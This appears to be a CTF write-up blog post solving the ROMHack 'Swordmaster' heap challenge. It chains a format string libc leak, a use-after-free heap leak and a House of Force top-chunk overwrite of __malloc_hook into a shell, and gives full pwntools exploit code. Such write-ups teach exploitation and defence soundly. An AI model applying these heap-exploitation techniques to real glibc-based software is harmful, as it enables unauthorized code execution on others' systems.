---
title: UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge
author: stigward 
date: 2022-09-26 11:33:00 +0800
categories: [CTF, PWN]
tags: [pwn, ctf, heap]
math: true
img_path: /assets/img/img_swordmaster/
---

# Swordmaster Pwn Challenge

## Overview:
This challenge was part of the ROMHack CTF hosted on HackTheBox's CTF platform. At the end of the 48 hour event, the challenge had roughly 10 solves. I was sadly not one of them, but did end up solving it Sunday night, a few hours after the CTF had concluded.

For this challenge, the binary, `libc.so.6`  and `ld-linux-x86-64.so.2` were provided. 

## TL;DR:
Getting the flag for this challenge requires the exploitation of 3 bugs. First, we can leak the base address of `libc` with a format string vulnerability. Next, we can obtain the base address of the heap with a Use-After-Free (UAF) vulnerability. Finally, we can corrupt the top chunk of the heap's metadata, allowing us to execute a "House Of Force" attack, overwriting `__malloc_hook` with `system` and obtaining a shell. 

## Recon - Functionality and RE:
### Binary Walkthrough:

When we first run the challenge binary, we are asked to input our name and choose our class. After that, we are shown the menu, where we can conduct a number of actions. 
![startup menu](binary_startup_and_menu.png)
We will talk about each menu option and it's underlying implementation as it becomes relevant to exploitation.
For now, let's jump into Ghidra and see if we can find any vulnerabilities.

### Reversing:
#### Player struct
Jumping into `main`, we first see that there is a global `player` structure. The program mallocs space for the player's name and class.

![read name](read_player_name.png)


Here we see the program reads `0x1f` bytes from `stdin` and assigns them to the first field in the player structure. Next, it takes in an integer and compares it in a big conditional statement. 

![set class](setting_player_class.png)

I have included the `if` statement for if a player chooses the number 2. We can see it prints that the mage class was chosen and then writes "Mage" to the other field in the player object which was previously malloc'd. After the conditional block for the chosen class is completed, the `player_init` function is run with the player structure passed in as a parameter. I have gone ahead and renamed the fields for easy of readability:

![player struct](player_struct.png)


So, with this, we can assume that the global player struct looks something like the following:
```C
struct Player {
	char *name;
	int level;
	int gold;
	int attack;
	int dex; 
	int hp;
	char *class;
}
```
This can be confirmed by observing the player structure (named `pl`) in gdb after `player_init` is run:

![player struct](player_struct_in_mem.png)
If we translate this memory layout to the struct above will get a player with a name stored at `0x0000555555605270`, a level of 1, 69 (0x45) gold, 10 (0xa) attack, 20 (0x14) dex, 100 (0x64) hp, and a class string stored at `0x00005555556052a0`. Running `heap chunks`, we can see our name and class name on the heap at the expected memory addresses:
![heap init](heap_chunks_init.png)

#### Menu Handler:
Now that we know how the player struct is stored in memory, let's take a look at the handler for the binary's game menu. 

![menu switch](menu_switch.png)
The program first checks to see if we still have enough remaining energy to execute. If our energy is out, the program returns. If we still have energy, the menu options are handled in a large switch statement based on the user input. We will talk more about each handler function as they become relevant to exploiting the challenge.

### Memory Protections and Libc:
Running `checksec`,  we can see what memory protections the binary has in place..spoiler alert, it's basically all of them

![checksec](check_sec.png)

With Stack Canaries, NX, and PIE it's unlikely we will be able to exploit a stack based vulnerability. Furthermore, full RELO makes the entire GOT read only, so we can't use an arbitrary write to overwrite a GOT address. This means we will likely be dealing with a heap based attack. Taking a look at the `libc` provided, we can see it is version 2.27

![version glibc](glibc_version_running.png)

We can refer to the following chart for valid heap based attacks by version of glibc:

![glibc verison](glibc_version.png)


## Vulnerabilities:
Now that we understand how the binary works, it's time to discuss the vulnerabilities. 

### Use-After-Free: 
The Use-after-free vuln was the first one I located, based strictly on the functionality of the binary. When we choose option 5 in the menu, we get a message stating `[!] Old class has been deleted and your stats will change! Feel free to choose another class!`. Taking a look at the `change_class` handler function below, we can confirm that first, `player->class` is assigned to a newly malloc'd pointer, and then that pointer is free'd.

![uaf static](uaf_static.png)

However, we know that menu option 3, "Show stats", will read from the class pointer in the player struct. So what happens if we run option 3 after option 5?

![uaf shown](UAF_in_class.png)

As shown above, our "Class" now seems to contain garbage data instead of "Mage".  Taking a look at program memory, we can see the player's class pointer points to `0x555555605300`, which after being free'd now contains two little-endian hex values: `0x5555556052d0` and `0x555555604010`.

![heap struct](heap_struct_uaf.png)


> The free'd chunks still show up in the heap chunks because of the tcache. Future posts will go into further details on the glibc internals.
{: .prompt-info }

You may notice that these hex values are the address of the previous chunk and the address of the first chunk respectively, thus leaking the address of the heap. I spent a while on this bug seeing if there was any way to weaponize it more, but the leak is the only primative it gives us. This will be helpful to bypass ASLR, but we will need another bug (or two) in order to craft an exploit.

### Heap Metadata Corruption:
Our second bug is in the binary's "Craft Sword" functionality, which is option 1 in the game menu.

![sword handler](sword_handler.png)

As shown above, the program reads our input and malloc's that size, allowing us the ability to malloc arbitrary sizes through normal program interaction. Next, it asks us to input a 1, 2, or 3 to choose what we want to "empower our sword" with. However, notice that instead of using the `read_num()` function, a standard `read` is used. This means we can specify any data, and it will be read to our newly malloc'd memory. Furthermore, you will notice that `read` will actually read up to `__size + 8` data into our `__buf` pointer, meaning there is a 7-byte heap based buffer overflow. We can confirm this by providing a size for malloc, and then a data payload that is 7 bytes longer than the specified size. 

![BoF](heap_based_buffer_overflow.png)

Now, observing our heap we see the following:

![top chunk overwrite](top_chunk_overwrite_mem.png)

We can see that our 7 byte overwrite affects the size of the top chunk in our program. Nice! This indicates we may be able to execute a [House Of Force](https://heap-exploitation.dhavalkapil.com/attacks/house_of_force) attack. Normally, the top chunk's size is the heap's total allocated space minus the already allocated chunk sizes, bordering the end of the heap memory. With the overflow, we can now force malloc to return and thus overwrite arbitrary pointers in memory OUTSIDE of the heap's memory space. However, due to ASLR, we don't know where things outside of the heap memory are located, and thus we need another leak...
### Format String:
Okay to be honest, this is where I got stuck while the CTF was still running and I felt a little silly afterwards. Thanks to the person in discord who was able to give me a small hint that pushed me in the right direction. 
Back in our `main` function, when we are prompted to pick a class, there is an `else` block in the conditional that auto assigns us the `Tank` class if our option does not match any of the acceptable options.

![format string](format_string_static.png)

As shown above, there conditional starts with three `printf` statements which combine to print `"There is no <USER INPUT> class! You will follow the Tank path..."`. Notice the second `printf` puts our user input directly into the function, resulting in a classic [format string vulnerability](https://owasp.org/www-community/attacks/Format_string_attack). Taking a look at how `menu_choice_2` is set, we see that we are constrained to 6 characters:

![menu choices](menu_choice.png)

We can leverage this vulnerability to leak variables from the stack. Lets use `%p` as our payload and set a break point right before the 2nd print (`main+521`) function call. We are trying to leak an address from libc, so we also need to find where libc is loaded. We can do so with `info proc mappings`. This results in the following:

![info proc](info_proc.png)

We can see the base address for `libc` is `0x7ffff79e2000`. This will change on each run (outside of GDB) due to ASLR as described earlier. 

Dumping the stack with `x/50gx $rsp`, we can see there is one stack variable which is a pointer to somewhere in `libc`'s memory range. 

![libc stack val](libc_stack.png)

Through a fairly boring and far-too-long manual process, I was able to determine the proper offset to leak this variable was 13. 

![libc leak](proper_address_leaked.png)

Then to determine our base address, we need to subtract `0x21c87`: 

`0x00007ffff7a03c87 - 0x21c87 = 0x7ffff79e2000 = libc base`

Nice, we now have everything we need to write an exploit!

## Exploit:
When doing research on House of Force, I found a [fantastic write-up](https://adamgold.github.io/posts/basic-heap-exploitation-house-of-force/) by Adam Force that explains a basic strategy to get RCE. The idea is to overwrite `__malloc_hook`, a function called before each malloc, with `system`, and pass it a pointer to `/bin/sh\0`. Therefore, our exploit will work as follows. 
1. Set our name to `/bin/sh\0`, which will be stored on the heap at an address we know through our leaks
2. Trigger the format string vuln to leak libc base
3. Choose menu option 5 to trigger the UAF vuln and then choose option 3 to leak the heap address
4. Use the craft sword function to corrupt the top chunk size
5. Use the craft sword function to allocate a chunk up to the address of `__malloc_hook`
6. Use the craft sword function to create chunk to overwrite `__malloc_hook` with the `system` address
7. Call craft sword one last time with a pointer to the name in our player object to get a shell.

### Step One:
We will use pwntools for this exploit. First we need to set up the binary to run with the provided `glibc` and then send it our name.

```python
from pwn import *

elf = ELF("./swordmaster")  
libc = ELF("./glibc/libc.so.6")  
p = elf.process(['./glibc/ld-linux-x86-64.so.2','./swordmaster'],env={"LD\_PRELOAD":"./glibc/libc.so.6"})  
  
p.sendline('/bin/sh\0')
```

### Step Two:
Next, we need to leak the libc address with the format string vulnerability. We can do so by waiting for the text prompt, sending `%13$p` as our class, and then parsing the address out of the received line. Lastly, we subtract `0x21c87` as described above and set `libc.address` accordingly. `pwntools` now knows the base address of libc and can load it's symbols at the proper addresses.

```python
p.recvuntil(b'>> ')  
p.sendline(b'%13$p')  
p.recvuntil('There is no ')  
  
libc_leak = p.recvline().split(b' ')[0]  
libc_leak = int(libc_leak[2:], 16)  
libc.address = libc_leak - 0x21c87
```

### Step 3: 
Similar to the above step, we need to interact with the program to exploit the UAF bug and get our heap base address. We do so by sending `5` to delete our player's class, and then sending `3` to display our stats. We can parse the received line and grab the leaked hex value, which we know from our previous recon will be the value of the previously allocated chunk. At this point in the program, the heap layout will always be the same, so we can use a static offset to get back to the heap base.

```python
p.recvuntil(b'>> ')  
p.sendline(b'5')  
p.recvuntil(b'>> ')  
p.sendline(b'3')  
p.recvuntil(b'Class: ')  
  
heap = p.recvline()[:-1]  
heap = int.from_bytes(heap, 'little') - 4800 - 0x10
```

### Step 4: 
Now it's time to start the heap exploitation process. To make matters simpler, we can write a wrapper around the craft sword program interaction. 
```python
def malloc(size, data):  
  p.recvuntil(b'>> ')  
  p.sendline(b'1')  
  p.recvuntil(b'>> ')  
  p.sendline(str(size))  
  p.recvuntil(b'>> ')  
  p.sendline(data)
```

Now we need to corrupt the top chunk size. We can do this programmatically the same way we did manually earlier:

```python
malloc(40, b'\x41'*47)
```

Next, we want to malloc all the way up to just before `__malloc_hook`. We can do so by doing the following: 
`__malloc_hook address - (heap base + already allocated space) - 0x10`. Looking at the current state of our heap at this point in the exploit, we see the following:

![heap mid exploit](heap_mid_exploit.png)

Adding all the allocated sizes together, we get `0x250 + 0x1010 + 0x30 + 0x30 + 0x30 + 0x30 = 0x1320`. We also need to add an additional `0x10` since we are using the heap base, which is `0x10` before the first chunk on the heap. Therefore we have the following code:

```python
distance = libc.sym.__malloc_hook - (heap + 0x1330) - 0x10  
malloc(distance, 'dummy')
```

Note that we subtract `0x10` so that we get a pointer just before `__malloc_hook`. Therefore, on the next call to malloc, the allocator will return a pointer to `__malloc_hook`.

### Step 5: 
Almost there, we need to call malloc another time. The data we include in this call will overwrite the `__malloc_hook`. Therefore, we use the following code:
```python
malloc(24, p64(libc.sym.system))
```

### Step 6:
Last step, we need to get a pointer to our name, `/bin/sh\0`. This is always located `0x1270` from the heap base. Instead of providing a size when crafting a sword, we will provide this pointer. Now instead of `__malloc_hook` running before the malloc takes place, `system("/bin/sh\0")` will run resulting in a shell.
```python
cmd = heap + 0x1270
p.recvuntil(b'>> ')
p.sendline(b'1')
p.recvuntil(b'>> ')
p.sendline(str(cmd))
```

### Full Exploit Code:
The full exploit is included below. You can also view it on my [github](https://github.com/stigward/PoCs-and-Exploits/tree/main/CTFs/ROMHack2022/swordmaster).

```python
from pwn import *  
import sys  
if not sys.warnoptions:  
  import warnings  
  warnings.simplefilter("ignore")  
  
elf = ELF("./swordmaster")  
libc = ELF("./glibc/libc.so.6")  
p = elf.process(['./glibc/ld-linux-x86-64.so.2','./swordmaster'],env={"LD\_PRELOAD":"./glibc/libc.so.6"})  
  
# ---- SET NAME ----  
p.sendline('/bin/sh\0')  
  
# ---- LEAK LIBC BASE WITH FORMAT STRING BUG ----  
p.recvuntil(b'>> ')  
p.sendline(b'%13$p')  
p.recvuntil('There is no ')  
  
libc_leak = p.recvline().split(b' ')[0]  
libc_leak = int(libc_leak[2:], 16)  
libc.address = libc_leak - 0x21c87  
  
log.info("LEAKED LIBC BASE: " + hex(libc.address))  
  
  
# ---- LEAK HEAP BASE WITH UAF BUG -------  
p.recvuntil(b'>> ')  
p.sendline(b'5')  
p.recvuntil(b'>> ')  
p.sendline(b'3')  
p.recvuntil(b'Class: ')  
  
heap = p.recvline()[:-1]  
heap = int.from_bytes(heap, 'little') - 4800 - 0x10  
  
log.info("LEAKED HEAP BASE: " + str(hex(heap)))  
  
def malloc(size, data):  
  p.recvuntil(b'>> ')  
  p.sendline(b'1')  
  p.recvuntil(b'>> ')  
  p.sendline(str(size))  
  p.recvuntil(b'>> ')  
  p.sendline(data)  
  
  
  
# ---- House Of Force Set-Up ----  
malloc(40, b'\x41'*47)  
  
# ---- Point top chunk to __malloc_hook ----  
distance = libc.sym.__malloc_hook - (heap + 0x1330) - 0x10  
malloc(distance, 'dummy')  
  
# ---- Overwrite __malloc_hook with system ----  
malloc(24, p64(libc.sym.system))  
  
# ---- Point cmd at our name (/bin/sh) and call malloc to execute our overwritten hook ----  
cmd = heap + 0x1270  
p.recvuntil(b'>> ')  
p.sendline(b'1')  
p.recvuntil(b'>> ')  
p.sendline(str(cmd))  
  
p.interactive()
```

![full exploit](exploit_success.png)
